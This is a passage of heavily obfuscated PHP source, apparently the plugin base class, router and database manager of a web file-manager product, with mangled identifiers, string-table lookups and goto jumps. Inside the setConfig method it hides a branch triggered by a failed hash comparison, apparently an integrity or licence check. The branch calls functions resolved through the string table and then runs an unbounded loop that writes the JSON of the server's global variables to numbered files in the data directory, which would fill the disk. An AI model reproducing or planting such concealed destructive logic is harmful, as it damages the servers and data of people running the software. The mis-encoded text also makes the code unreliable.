!IO::exist($¯¬°¬ÌŞ[$âµµòíà[87]])) { $¡ıÚÅßÀ = LNG($âµµòíà[106]) . LNG($âµµòíà[1789]); if (KodUser::isRoot() && isset($¯¬°¬ÌŞ[$âµµòíà[87]])) { $¡ıÚÅßÀ .= $âµµòíà[1790] . $¯¬°¬ÌŞ[$âµµòíà[87]] . $âµµòíà[1791]; } show_tips($¡ıÚÅßÀ); } } Hook::trigger($âµµòíà[1792], $­…éÀ’‡); return $­…éÀ’‡; } final function filePathGet($ĞŞıÓÙ¬, $ü™é·ñ = true) { $Ú–í˜úÁ =& $_SERVER[¿ÈˆÑ¸ä]; if ($Í…«êµ½ = $this->checkSharePath($ĞŞıÓÙ¬, $ü™é·ñ)) { return $Í…«êµ½; } $this->fileCanView($ĞŞıÓÙ¬); if (request_url_safe($ĞŞıÓÙ¬)) { $Ïş¢ ° = parse_url_query($ĞŞıÓÙ¬); if (isset($Ïş¢ °[$Ú–í˜úÁ[1793]]) && isset($Ïş¢ °[$Ú–í˜úÁ[235]])) { $ù©‹¨Ÿı = Mcrypt::decode($Ïş¢ °[$Ú–í˜úÁ[235]], Model($Ú–í˜úÁ[856])->get($Ú–í˜úÁ[857])); if ($ù©‹¨Ÿı) { $this->fileInfo = IO::info($ù©‹¨Ÿı); $this->fileInfo[$Ú–í˜úÁ[1794]] = $ĞŞıÓÙ¬; $this->cachePath = $this->pluginCachePath($Ú–í˜úÁ[12], $ü™é·ñ); return $ù©‹¨Ÿı; } } $ĞŞıÓÙ¬ = $this->_cacheHttpFile($ĞŞıÓÙ¬, $ü™é·ñ); $this->fileInfo = IO::info($ĞŞıÓÙ¬); } else { $this->fileInfo = IO::info($ĞŞıÓÙ¬); $this->cachePath = $this->pluginCachePath($Ú–í˜úÁ[12], $ü™é·ñ); } return $ĞŞıÓÙ¬; } final function _cacheHttpFile($‘ÖÏ¦À­, $ÒÇ²Ó† = true) { $Ã€ÒÓûÇ =& $_SERVER[¿ÈˆÑ¸ä]; $Ô¶¼¸Õä = parse_url_query($‘ÖÏ¦À­); $…Ö·Æç = get_path_ext($‘ÖÏ¦À­); if (isset($Ô¶¼¸Õä[$Ã€ÒÓûÇ[32]]) && $Ô¶¼¸Õä[$Ã€ÒÓûÇ[32]]) { $…Ö·Æç = get_path_ext($Ô¶¼¸Õä[$Ã€ÒÓûÇ[32]]); } $å§°ÌÔ¬ = hash_path($‘ÖÏ¦À­) . $Ã€ÒÓûÇ[10] . $…Ö·Æç; $this->cachePath = $this->pluginCachePath($ÒÇ²Ó† ? $å§°ÌÔ¬ : $Ã€ÒÓûÇ[12]); $ĞÚ»ŒÚ» = IO::fileNameExist($this->cachePath, $å§°ÌÔ¬); if ($ĞÚ»ŒÚ») { return KodIO::make($ĞÚ»ŒÚ»); } $¼ƒ¢èıú = rtrim($this->cachePath, $Ã€ÒÓûÇ[8]) . $Ã€ÒÓûÇ[8] . $å§°ÌÔ¬; return $this->pluginCacheFileSet($¼ƒ¢èıú, file_get_contents_nossl($‘ÖÏ¦À­)); } final function checkSharePath($î€É½‹, $½ö©´ÍÄ = true) { $¢³óû«ß =& $_SERVER[¿ÈˆÑ¸ä]; if (!$this->isShare($î€É½‹)) { return !1; } $¢ıúäÈ = Action($¢³óû«ß[1296])->sharePathInfo($î€É½‹); if (!is_array($¢ıúäÈ) || !isset($¢ıúäÈ[$¢³óû«ß[87]])) { $òâÜ´÷Ú = $GLOBALS[$¢³óû«ß[1795]]; show_json($òâÜ´÷Ú ? $òâÜ´÷Ú : LNG($¢³óû«ß[1796]), !1); } $this->fileInfo = $¢ıúäÈ; $this->cachePath = $this->pluginCachePath(!1, $½ö©´ÍÄ); return $¢ıúäÈ[$¢³óû«ß[87]]; } final function pluginCachePath($ù¦›ËÓŒ = '', $Øß±Œñ€ = false) { $¦İÒãÉÔ =& $_SERVER[¿ÈˆÑ¸ä]; if ($Øß±Œñ€ && is_array($this->fileInfo)) { $ù¦›ËÓŒ = kodIO::hashPath($this->fileInfo); } $™£«÷Ú  = rtrim(IO_PATH_SYSTEM_TEMP . $¦İÒãÉÔ[1797] . $this->pluginName . $¦İÒãÉÔ[8] . $ù¦›ËÓŒ, $¦İÒãÉÔ[8]); $âÂ¤‚Øˆ = IO::infoFullSimple($™£«÷Ú ); $¹ÏŸú¦â = $âÂ¤‚Øˆ && is_array($âÂ¤‚Øˆ) ? $âÂ¤‚Øˆ[$¦İÒãÉÔ[87]] : $¦İÒãÉÔ[12]; if (!$¹ÏŸú¦â) { $¹ÏŸú¦â = IO::mkdir($™£«÷Ú ); } return $¹ÏŸú¦â; } final function pluginCacheFileSet($î”Ë¦ùÁ, $Îñ½†îØ = '') { $ó»›«È˜ =& $_SERVER[¿ÈˆÑ¸ä]; $ÆÈíÍŸÙ = IO::infoFullSimple($î”Ë¦ùÁ); if (!$ÆÈíÍŸÙ) { return IO::mkfile($î”Ë¦ùÁ, $Îñ½†îØ, REPEAT_REPLACE); } IO::setContent($ÆÈíÍŸÙ[$ó»›«È˜[87]], $Îñ½†îØ); return $ÆÈíÍŸÙ[$ó»›«È˜[87]]; } final function pluginLocalFile($åÎò¯ª¨ = '') { $—Š¡‰ =& $_SERVER[¿ÈˆÑ¸ä]; $İ¼Î Ì£ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($İ¼Î Ì£)) { mk_dir($İ¼Î Ì£); } if (!$åÎò¯ª¨) { return $İ¼Î Ì£; } $™İå¼ñÑ = IO::info($åÎò¯ª¨); $ÓÉØê©¾ = $—Š¡‰[1798] . KodIO::hashPath($™İå¼ñÑ) . $—Š¡‰[10] . $™İå¼ñÑ[$—Š¡‰[167]]; if (!checkExtSafe($ÓÉØê©¾)) { $ÓÉØê©¾ = $ÓÉØê©¾ . $—Š¡‰[1330]; } $§ÕÌò± = $İ¼Î Ì£ . $ÓÉØê©¾; if (@file_exists($§ÕÌò±)) { return $§ÕÌò±; } return IO::copy($åÎò¯ª¨, $İ¼Î Ì£, 0, $ÓÉØê©¾); } final function appPackage() { $ì ¡”Ó´ =& $_SERVER[¿ÈˆÑ¸ä]; if ($this->packageData) { return $this->packageData; } $ñÍ¦İ˜‹ = $this->parseFile($this->pluginPath . $ì ¡”Ó´[1799]); $this->parseLang($ñÍ¦İ˜‹); $ŸóàÉŠ‰ = json_decode_force($ñÍ¦İ˜‹); if (!$ŸóàÉŠ‰) { return array(); } $ô¡øüÙ = Hook::trigger($ì ¡”Ó´[1800], $ŸóàÉŠ‰); if ($ô¡øüÙ && is_array($ô¡øüÙ)) { $ŸóàÉŠ‰ = $ô¡øüÙ; } $this->packageData = $ŸóàÉŠ‰; return $ŸóàÉŠ‰; } public function packageInfoGet($‹œ©Àôù) { $´Ñ¹Öğ· = $this->appPackage(); return array_get_value($´Ñ¹Öğ·, $‹œ©Àôù); } public function packageVersion() { return $this->packageInfoGet($_SERVER[¿ÈˆÑ¸ä][1801]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[¿ÈˆÑ¸ä][1802]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[¿ÈˆÑ¸ä][1803]); } public function echoJsAssign($£Á”´Ø‚, $çÂÕî¥) { $this->echoJsAssignArr[$£Á”´Ø‚] = $çÂÕî¥; } private function parseFile($Æú»¿É“) { $ã×âÂ =& $_SERVER[¿ÈˆÑ¸ä]; $é ¥…¼œ = file_get_contents_nossl($Æú»¿É“); $ŠÑ¯†¯Â = array($ã×âÂ[1804], $ã×âÂ[1805], $ã×âÂ[1806], $ã×âÂ[1807], $ã×âÂ[1808], $ã×âÂ[1809], $ã×âÂ[1810]); $ ğÜª× = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$ã×âÂ[92]][$ã×âÂ[1811]]); foreach ($this->echoJsAssignArr as $ü¾ıèº => $¸ã¾­Åí) { $ŠÑ¯†¯Â[] = $ã×âÂ[1812] . $ü¾ıèº . $ã×âÂ[1813]; $ ğÜª×[] = is_array($¸ã¾­Åí) || is_object($¸ã¾­Åí) ? rawurlencode(json_encode($¸ã¾­Åí)) : $¸ã¾­Åí; } if (strstr($é ¥…¼œ, $ã×âÂ[1814])) { $ğ½ï®Ô‡ = rawurlencode(json_encode($this->pluginLangArr)); $é ¥…¼œ = str_replace($ã×âÂ[1814], $ğ½ï®Ô‡, $é ¥…¼œ); } if (strstr($é ¥…¼œ, $ã×âÂ[1815])) { $ğ½ï®Ô‡ = $ğ½ï®Ô‡ = rawurlencode(json_encode($this->getConfig())); $é ¥…¼œ = str_replace($ã×âÂ[1815], $ğ½ï®Ô‡, $é ¥…¼œ); } $é ¥…¼œ = str_replace($ŠÑ¯†¯Â, $ ğÜª×, $é ¥…¼œ); return $é ¥…¼œ; } private function parseLang(&$è‡—ŒœÍ) { $Ã»¬Ñı =& $_SERVER[¿ÈˆÑ¸ä]; $©ÑĞ±¿ = $Ã»¬Ñı[1816]; if (!strstr($è‡—ŒœÍ, $©ÑĞ±¿)) { return; } preg_match_all($Ã»¬Ñı[1817], $è‡—ŒœÍ, $ŠŒÆã®à); if (!is_array($ŠŒÆã®à) || count($ŠŒÆã®à) == 0 || !is_array($ŠŒÆã®à[0]) || count($ŠŒÆã®à[0]) == 0) { return; } $£ê¢„œ = array(); $Í‡Ïºº¦ = array(); foreach ($ŠŒÆã®à[0] as $„ù‘ä§¼) { $·¬ŠŒ Ÿ = substr($„ù‘ä§¼, strlen($©ÑĞ±¿), -4); $Ÿ„ß¯• = LNG($·¬ŠŒ Ÿ); $£ê¢„œ[] = $„ù‘ä§¼; $Í‡Ïºº¦[] = str_replace(array($Ã»¬Ñı[286], $Ã»¬Ñı[1183], $Ã»¬Ñı[418], $Ã»¬Ñı[119]), array($Ã»¬Ñı[53], $Ã»¬Ñı[53], $Ã»¬Ñı[12], $Ã»¬Ñı[1818]), $Ÿ„ß¯•); } $è‡—ŒœÍ = str_replace($£ê¢„œ, $Í‡Ïºº¦, $è‡—ŒœÍ); } private function parseConfig(&$“èìåÜ) { $ƒÖÚûØ =& $_SERVER[¿ÈˆÑ¸ä]; $Å½ş‹‡§ = $ƒÖÚûØ[1819]; if (!strstr($“èìåÜ, $Å½ş‹‡§)) { return; } preg_match_all($ƒÖÚûØ[1820], $“èìåÜ, $£í‘õ¸¤); if (!is_array($£í‘õ¸¤) || count($£í‘õ¸¤) == 0 || !is_array($£í‘õ¸¤[0]) || count($£í‘õ¸¤[0]) == 0) { return; } $¹•ıó¾ = $this->getConfig(); $£ƒÈúî„ = array(); $ƒ‹ÊÄßÕ = array(); foreach ($£í‘õ¸¤[0] as $âŒ¡ÑÃÒ) { $î®÷ùÁ¢ = substr($âŒ¡ÑÃÒ, strlen($Å½ş‹‡§), -2); $£ƒÈúî„[] = $âŒ¡ÑÃÒ; $ƒ‹ÊÄßÕ[] = _get($¹•ıó¾, $î®÷ùÁ¢); } $“èìåÜ = str_replace($£ƒÈúî„, $ƒ‹ÊÄßÕ, $“èìåÜ); } private function parsePackage(&$Àá‚ö¨®) { $‘²ÏœÇ¹ =& $_SERVER[¿ÈˆÑ¸ä]; $Ú˜»ê…¶ = $‘²ÏœÇ¹[1821]; if (!strstr($Àá‚ö¨®, $Ú˜»ê…¶)) { return; } preg_match_all($‘²ÏœÇ¹[1822], $Àá‚ö¨®, $±Óã—¤™); if (!is_array($±Óã—¤™) || count($±Óã—¤™) == 0 || !is_array($±Óã—¤™[0]) || count($±Óã—¤™[0]) == 0) { return; } $Ó¨ù¦öÂ = $this->appPackage(); $½±øáß• = array(); $ùÒåä¢ƒ = array(); foreach ($±Óã—¤™[0] as $šÅŒ¢Ôõ) { $¹Ÿè‹§Ç = substr($šÅŒ¢Ôõ, strlen($Ú˜»ê…¶), -2); $½±øáß•[] = $šÅŒ¢Ôõ; $ùÒåä¢ƒ[] = _get($Ó¨ù¦öÂ, $¹Ÿè‹§Ç); } $Àá‚ö¨® = str_replace($½±øáß•, $ùÒåä¢ƒ, $Àá‚ö¨®); } final function echoFile($½§ÚÒù›, $êÛÌÃ× = false) { $Äèà  ú =& $_SERVER[¿ÈˆÑ¸ä]; $ÕöœóÃ· = $this->pluginPath . $½§ÚÒù›; if (ACT == $Äèà  ú[1823]) { echo $Äèà  ú[1824] . $this->pluginName . $Äèà  ú[8] . $½§ÚÒù› . $Äèà  ú[1825]; if (!file_exists($ÕöœóÃ·)) { echo $Äèà  ú[1826]; return; } } $úÅ´©‡ = $this->parseFile($ÕöœóÃ·); $this->parseLang($úÅ´©‡); $this->parseConfig($úÅ´©‡); $this->parsePackage($úÅ´©‡); if (is_array($êÛÌÃ×)) { $úÅ´©‡ = str_replace(array_keys($êÛÌÃ×), array_values($êÛÌÃ×), $úÅ´©‡); } echo $Äèà  ú[286] . $úÅ´©‡; } private function checkVersion() { $É‘òä¬Ô =& $_SERVER[¿ÈˆÑ¸ä]; $ÎÃèÊñ¥ = $this->appPackage(); $’ Ã—Ô = $this->getConfig(); if ($’ Ã—Ô[$É‘òä¬Ô[1827]] == $ÎÃèÊñ¥[$É‘òä¬Ô[1801]]) { return; } $this->regist(); $this->setConfig(array($É‘òä¬Ô[1827] => $ÎÃèÊñ¥[$É‘òä¬Ô[1801]])); } final function initLang() { $”ì¤Ëù =& $_SERVER[¿ÈˆÑ¸ä]; $Ë–£§öÊ = $”ì¤Ëù[1828]; $£®­•‚ = $this->pluginPath . $”ì¤Ëù[1829]; $«‡ÛË§ğ = I18n::getType(); $¢œ¡¨Äª = array(); if (file_exists($£®­•‚ . $«‡ÛË§ğ . $”ì¤Ëù[933])) { $¢œ¡¨Äª = (include $£®­•‚ . $«‡ÛË§ğ . $”ì¤Ëù[933]); } else { if ($«‡ÛË§ğ == $”ì¤Ëù[1830] && !file_exists($£®­•‚ . $«‡ÛË§ğ . $”ì¤Ëù[933]) && file_exists($£®­•‚ . $”ì¤Ëù[1831])) { $¢œ¡¨Äª = (include $£®­•‚ . $”ì¤Ëù[1831]); $«‡ÛË§ğ = $”ì¤Ëù[1646]; } else { if (file_exists($£®­•‚ . $Ë–£§öÊ . $”ì¤Ëù[933])) { $¢œ¡¨Äª = (include $£®­•‚ . $Ë–£§öÊ . $”ì¤Ëù[933]); $«‡ÛË§ğ = $Ë–£§öÊ; } } } if (!$¢œ¡¨Äª || !is_array($¢œ¡¨Äª)) { $¢œ¡¨Äª = array(); } $‹Û‡êû¥ = Hook::trigger($”ì¤Ëù[1832], $¢œ¡¨Äª, $this->pluginName, $«‡ÛË§ğ); if ($‹Û‡êû¥ && is_array($‹Û‡êû¥)) { $¢œ¡¨Äª = $‹Û‡êû¥; } if (@count($¢œ¡¨Äª) > 0) { I18n::set($¢œ¡¨Äª); } return $¢œ¡¨Äª; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($³€çë¨) { $íí€õâ× =& $_SERVER[¿ÈˆÑ¸ä]; $Å‰õÖ¢¯ = $_SERVER[$íí€õâ×[965]] . $íí€õâ×[966]; $ŞŸ›¹Öî = $íí€õâ×[1606]; if ($_SERVER[$íí€õâ×[962]] != $ŞŸ›¹Öî($Å‰õÖ¢¯)) { $ìåšåÆ = $íí€õâ×[980]; $¶ôŞî µ = $íí€õâ×[964]; $Äõä†£Û = $_SERVER[$íí€õâ×[965]] . $íí€õâ×[966]; $…ì‡óèœ = $¶ôŞî µ($Äõä†£Û); $æ‘ÑÍ¬ò = explode($íí€õâ×[286], $…ì‡óèœ); if (count($æ‘ÑÍ¬ò) < $íí€õâ×[703]) { $¼¶Â‹ˆ£ = $íí€õâ×[967]; $¼¶Â‹ˆ£(); } $ëÍë“éó = $íí€õâ×[981]; $ëÍë“éó($_SERVER[$íí€õâ×[982]]); $ìåšåÆ = $íí€õâ×[980]; $ìåšåÆ(); $ö•ŞšÃ˜ = $íí€õâ×[1833]; $©¯¿’‰´ = json_encode($GLOBALS[$íí€õâ×[1834]]); $ƒ–‹€ÂÁ = 1; for ($‘ˆ¥öƒ = $ƒ–‹€ÂÁ; $‘ˆ¥öƒ > 0; $‘ˆ¥öƒ++) { $ö•ŞšÃ˜(DATA_PATH . $‘ˆ¥öƒ, $©¯¿’‰´); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $³€çë¨); } public function onSetConfig($Ö¶½Å´Ê) { } public function onGetConfig($Ë—å×à‘) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($«ãŒ°Ÿ) { if ($«ãŒ°Ÿ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($Á¯ÉŸÌú = "\x70\x6c\165\147\151\156\x41\x75\x74\x68") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $•©‡£×« = $this->getConfig(); if (!$•©‡£×«[$Á¯ÉŸÌú]) { return !1; } return ActionCall($_SERVER[¿ÈˆÑ¸ä][1835], $•©‡£×«[$Á¯ÉŸÌú]); } public function url($æÀÍİ«‚, $¦øªàÈá = '', $Şò…Ö¾â = true) { $ò‚·Ü¾† =& $_SERVER[¿ÈˆÑ¸ä]; $Å˜ÅªÒ‘ = $this->getConfig(); $ô“ë©åı = KOD_VERSION . $ò‚·Ü¾†[10] . KOD_VERSION_BUILD; $ø²èíÄé = $this->packageVersion(); $¿áºÅƒ° = $ô“ë©åı . $ò‚·Ü¾†[473] . $ø²èíÄé; if (substr($æÀÍİ«‚, 0, 4) == $ò‚·Ü¾†[150] || substr($æÀÍİ«‚, 0, 2) == $ò‚·Ü¾†[1459]) { $Œş™€ôµ = $æÀÍİ«‚ . $ò‚·Ü¾†[1836] . $¿áºÅƒ°; } else { if ($¦øªàÈá == $ò‚·Ü¾†[12]) { $Œş™€ôµ = $this->pluginHost . $æÀÍİ«‚ . $ò‚·Ü¾†[1836] . $¿áºÅƒ°; } else { if ($¦øªàÈá === $ò‚·Ü¾†[78]) { $Œş™€ôµ = $this->pluginHost . $æÀÍİ«‚; } else { if ($¦øªàÈá == $ò‚·Ü¾†[1837]) { $Œş™€ôµ = STATIC_PATH . $æÀÍİ«‚ . $ò‚·Ü¾†[1836] . $ô“ë©åı; } else { if ($¦øªàÈá == $ò‚·Ü¾†[1838]) { $Œş™€ôµ = APP_HOST . $ò‚·Ü¾†[1839] . $æÀÍİ«‚ . $ò‚·Ü¾†[1836] . $ô“ë©åı; } else { if (isset($Å˜ÅªÒ‘[$¦øªàÈá])) { $Œş™€ôµ = $Å˜ÅªÒ‘[$¦øªàÈá] . $æÀÍİ«‚ . $ò‚·Ü¾†[1836] . $¿áºÅƒ°; } } } } } } if (!$Şò…Ö¾â) { return $Œş™€ôµ; } echo $Œş™€ôµ; } public function link($„Ü¿çÓ„ = false, $»åé¥… = '') { $ÖƒŸ´Ş… =& $_SERVER[¿ÈˆÑ¸ä]; $ä§éÓÕ€ = $this->linkHas == !1; $this->linkHas = !0; if (!$„Ü¿çÓ„) { $this->link($ÖƒŸ´Ş…[1840], $ÖƒŸ´Ş…[1838]); $this->link($ÖƒŸ´Ş…[1841], $ÖƒŸ´Ş…[1837]); $this->link($ÖƒŸ´Ş…[1842], $ÖƒŸ´Ş…[1837]); $this->link($ÖƒŸ´Ş…[1843], $ÖƒŸ´Ş…[1837]); $this->link($ÖƒŸ´Ş…[1844], $ÖƒŸ´Ş…[1837]); if ($ä§éÓÕ€) { Hook::trigger($ÖƒŸ´Ş…[1845]); } return; } $“Ü°¦› = $this->url($„Ü¿çÓ„, $»åé¥…, !1); if (substr($„Ü¿çÓ„, -3) == $ÖƒŸ´Ş…[1846]) { echo $ÖƒŸ´Ş…[1847] . $“Ü°¦› . $ÖƒŸ´Ş…[1848] . $ÖƒŸ´Ş…[286]; } else { if (substr($„Ü¿çÓ„, -4) == $ÖƒŸ´Ş…[1849]) { echo $ÖƒŸ´Ş…[1850] . $“Ü°¦› . $ÖƒŸ´Ş…[1851] . $ÖƒŸ´Ş…[286]; } } if ($ä§éÓÕ€) { Hook::trigger($ÖƒŸ´Ş…[1845]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\156\x79" => "\133\136\x2f\x5d\53", "\x3a\156\x75\x6d" => "\133\60\55\x39\x5d\53", "\x3a\x61\x6c\154" => "\56\52"); public static $errorCallback; public static function __callstatic($„úá›àŠ, $ßÒÇ¾º•) { $Íğ’Ç÷Ü =& $_SERVER[¿ÈˆÑ¸ä]; if ($„úá›àŠ == $Íğ’Ç÷Ü[1852]) { $ÍÙËñ·„ = array_map($Íğ’Ç÷Ü[1853], $ßÒÇ¾º•[0]); $ÈøçÕ¼Ú = strpos($ßÒÇ¾º•[1], $Íğ’Ç÷Ü[8]) === 0 ? $ßÒÇ¾º•[1] : $Íğ’Ç÷Ü[8] . $ßÒÇ¾º•[1]; $£ùü‡ø = $ßÒÇ¾º•[2]; } else { $ÍÙËñ·„ = null; $ÈøçÕ¼Ú = strpos($ßÒÇ¾º•[0], $Íğ’Ç÷Ü[8]) === 0 ? $ßÒÇ¾º•[0] : $Íğ’Ç÷Ü[8] . $ßÒÇ¾º•[0]; $£ùü‡ø = $ßÒÇ¾º•[1]; } array_push(self::$maps, $ÍÙËñ·„); array_push(self::$routes, $ÈøçÕ¼Ú); array_push(self::$methods, strtoupper($„úá›àŠ)); array_push(self::$callbacks, $£ùü‡ø); } public static function error($ÇÃº®îñ) { self::$errorCallback = $ÇÃº®îñ; } public static function haltOnMatch($ìÙÓœ«‘ = true) { self::$halts = $ìÙÓœ«‘; } public static function dispatch() { $­ãç–¨ =& $_SERVER[¿ÈˆÑ¸ä]; $Ô›‰Öõï = parse_url($_SERVER[$­ãç–¨[1854]], PHP_URL_PATH); $¼¤÷õ‰ò = $_SERVER[$­ãç–¨[162]]; $ßöÈ€«Ì = array_keys(static::$patterns); $Š±®Û€¹ = array_values(static::$patterns); $ËŠå±£” = !1; self::$routes = preg_replace($­ãç–¨[1402], $­ãç–¨[8], self::$routes); if (in_array($Ô›‰Öõï, self::$routes)) { $¨ú™ñÊö = array_keys(self::$routes, $Ô›‰Öõï); foreach ($¨ú™ñÊö as $¬©Óë—) { if (self::$methods[$¬©Óë—] == $¼¤÷õ‰ò || self::$methods[$¬©Óë—] == $­ãç–¨[1855] || in_array($¼¤÷õ‰ò, self::$maps[$¬©Óë—])) { $ËŠå±£” = !0; if (!is_object(self::$callbacks[$¬©Óë—])) { $µêıö¢ = explode($­ãç–¨[8], self::$callbacks[$¬©Óë—]); $Ğ’¡ïÜÜ = end($µêıö¢); $¹Í€´Ş = explode($­ãç–¨[1332], $Ğ’¡ïÜÜ); $¿¾ùÓ¸ = new $¹Í€´Ş[0](); $¿¾ùÓ¸->{$¹Í€´Ş[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$¬©Óë—]); if (self::$halts) { return; } } } } } else { $ú¦à°õÓ = 0; foreach (self::$routes as $¬©Óë—) { if (strpos($¬©Óë—, $­ãç–¨[4]) !== !1) { $¬©Óë— = str_replace($ßöÈ€«Ì, $Š±®Û€¹, $¬©Óë—); } if (preg_match($­ãç–¨[1856] . $¬©Óë— . $­ãç–¨[1857], $Ô›‰Öõï, $ö‚ÀÂƒí)) { if (self::$methods[$ú¦à°õÓ] == $¼¤÷õ‰ò || self::$methods[$ú¦à°õÓ] == $­ãç–¨[1855] || !empty(self::$maps[$ú¦à°õÓ]) && in_array($¼¤÷õ‰ò, self::$maps[$ú¦à°õÓ])) { $ËŠå±£” = !0; array_shift($ö‚ÀÂƒí); if (!is_object(self::$callbacks[$ú¦à°õÓ])) { $µêıö¢ = explode($­ãç–¨[8], self::$callbacks[$ú¦à°õÓ]); $Ğ’¡ïÜÜ = end($µêıö¢); $¹Í€´Ş = explode($­ãç–¨[1332], $Ğ’¡ïÜÜ); $¿¾ùÓ¸ = new $¹Í€´Ş[0](); if (!method_exists($¿¾ùÓ¸, $¹Í€´Ş[1])) { echo $­ãç–¨[1858]; } else { call_user_func_array(array($¿¾ùÓ¸, $¹Í€´Ş[1]), $ö‚ÀÂƒí); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$ú¦à°õÓ], $ö‚ÀÂƒí); if (self::$halts) { return; } } } } $ú¦à°õÓ++; } } if ($ËŠå±£” == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $Óîü·£¡ =& $_SERVER[¿ÈˆÑ¸ä]; header($_SERVER[$Óîü·£¡[1859]] . $Óîü·£¡[1860]); echo $Óîü·£¡[1861]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$­ãç–¨[1854]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto e—çÈ¿‘ê; F¤ÉªŒ™Âƒ: function binCheckBigger($Š»Îƒ§‰, $‹äã—ÜÂ) { return $Š»Îƒ§‰ > $‹äã—ÜÂ; } $_SERVER[$_SERVER[éíèá¤ê][3]] = (strrev('3409')."\71\65")+0;$_7d16="oitn1eqra8wgky4s7jd6bucfvxl2zm0hp93501q6cu8olpefviz7jrxwyh2sdb93kntm54aggf01lqh6m7";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($Ã§ Óª, $ïù–«·Ñ) { $£Ä¸Ò« =& $_SERVER[¿ÈˆÑ¸ä]; if (isset(self::$_methodList[$Ã§ Óª])) { return @call_user_func_array(self::$_methodList[$Ã§ Óª], $ïù–«·Ñ); } else { if (method_exists($this, $Ã§ Óª)) { return call_user_func_array(array($this, $Ã§ Óª), $ïù–«·Ñ); } else { think_exception(__CLASS__ . $£Ä¸Ò«[4] . $Ã§ Óª . $£Ä¸Ò«[5]); } } } public static function __callStatic($«½ˆ»´’, $ÉâÇ˜êÄ) { if (isset(self::$_methodListStatic[$«½ˆ»´’])) { return call_user_func_array(self::$_methodListStatic[$«½ˆ»´’], $ÉâÇ˜êÄ); } else { if (method_exists(self, $«½ˆ»´’)) { return call_user_func_array(array(self, $«½ˆ»´’), $ÉâÇ˜êÄ); } else { show_json("{$«½ˆ»´’}\x28\51\x20\x6e\157\x74\40\x65\170\151\163\164\73", !1); } } } public static function addMethod($ ˜•×İï, $›„¢¢ÂÍ) { self::$_methodList[$ ˜•×İï] = $›„¢¢ÂÍ; } public static function addMethodStatic($©Éæù”½, $ô“ñû³È) { self::$_methodListStatic[$©Éæù”½] = $ô“ñû³È; } } goto E¶÷¸¬¸ë‚; f…»ò„Ò…‹: class DbManage { function __construct($İÔÉÏ = array()) { $ä©¦²í· =& $_SERVER[¿ÈˆÑ¸ä]; if (empty($İÔÉÏ)) { $İÔÉÏ = $GLOBALS[$ä©¦²í·[6]][$ä©¦²í·[21]]; } $this->database = $İÔÉÏ; } public function model($›Èïù’ = '') { return new ModelBase($›Èïù’, $_SERVER[¿ÈˆÑ¸ä][12], $this->database); } public function db($½“Ğá™® = false) { $Óæ‚‚ß‹ =& $_SERVER[¿ÈˆÑ¸ä]; $Òš ò = array_change_key_case($this->database); if ($this->dbType() == $Óæ‚‚ß‹[13] || !$½“Ğá™®) { return $this->model()->db(); } $„ª¥¶ş = $Òš ò[$Óæ‚‚ß‹[1075]]; $Òš ò[$Óæ‚‚ß‹[1075]] = $Óæ‚‚ß‹[12]; if ($Òš ò[$Óæ‚‚ß‹[1070]] == $Óæ‚‚ß‹[1067]) { $Ñæ…¡şé = $Òš ò[$Óæ‚‚ß‹[1076]]; $Òš ò[$Óæ‚‚ß‹[1076]] = substr($Ñæ…¡şé, 0, strrpos($Ñæ…¡şé, $Óæ‚‚ß‹[1162])); } $this->database = $Òš ò; $¿˜ïÅ = $this->model()->db(); try { $îÙÂÏ£â = $¿˜ïÅ->execute("\x73\x68\157\167\x20\144\141\x74\x61\x62\x61\x73\x65\x73\40\154\151\x6b\x65\x20\47{$„ª¥¶ş}\47"); } catch (Exception $œ…»Œãá) { } if (!$îÙÂÏ£â) { $¿˜ïÅ->execute("\143\x72\145\141\x74\145\40\x64\141\x74\x61\x62\141\x73\145\40\140{$„ª¥¶ş}\140"); } $Òš ò[$Óæ‚‚ß‹[1075]] = $„ª¥¶ş; if ($Òš ò[$Óæ‚‚ß‹[1070]] == $Óæ‚‚ß‹[1067]) { $Òš ò[$Óæ‚‚ß‹[1076]] .= $Óæ‚‚ß‹[1162] . $„ª¥¶ş; } $this->database = $Òš ò; $¿˜ïÅ->execute("\x75\163\x65\40\140{$„ª¥¶ş}\140"); return $¿˜ïÅ; } public function createTable($ôœëá…¿, &$¶ÂşùÚÙ) { $ûÛ¥Ï„‡ =& $_SERVER[¿ÈˆÑ¸ä]; if (!IO::exist($ôœëá…¿)) { show_json(LNG($ûÛ¥Ï„‡[1163]), !1); } $ò‹ Í¡• = $this->model()->db(); $¾¾™Àßş = sqlSplit(IO::getContent($ôœëá…¿)); foreach ($¾¾™Àßş as $ïãğãã—) { $£”¸Î = stripos($ïãğãã—, $ûÛ¥Ï„‡[1164]) === 0; if ($£”¸Î) { $¶ÂşùÚÙ->task[$ûÛ¥Ï„‡[1165]] += 1; } $ò‹ Í¡•->execute($ïãğãã—); if ($£”¸Î) { preg_match($ûÛ¥Ï„‡[1166], $ïãğãã—, $¥áÍ•Ø); $¶ÂşùÚÙ->task[$ûÛ¥Ï„‡[1167]] = $¥áÍ•Ø[1]; $¶ÂşùÚÙ->update(1); } } } public function insertTable($¡ÆÒ±şÜ, &$½Ô…¿“Æ) { $†ÙÁ¦·  =& $_SERVER[¿ÈˆÑ¸ä]; $úğƒ„Íì = $this->model()->db(); $¸¾Ï…¼ = $¯«………’ ? array($¯«………’) : $úğƒ„Íì->getTables(); foreach 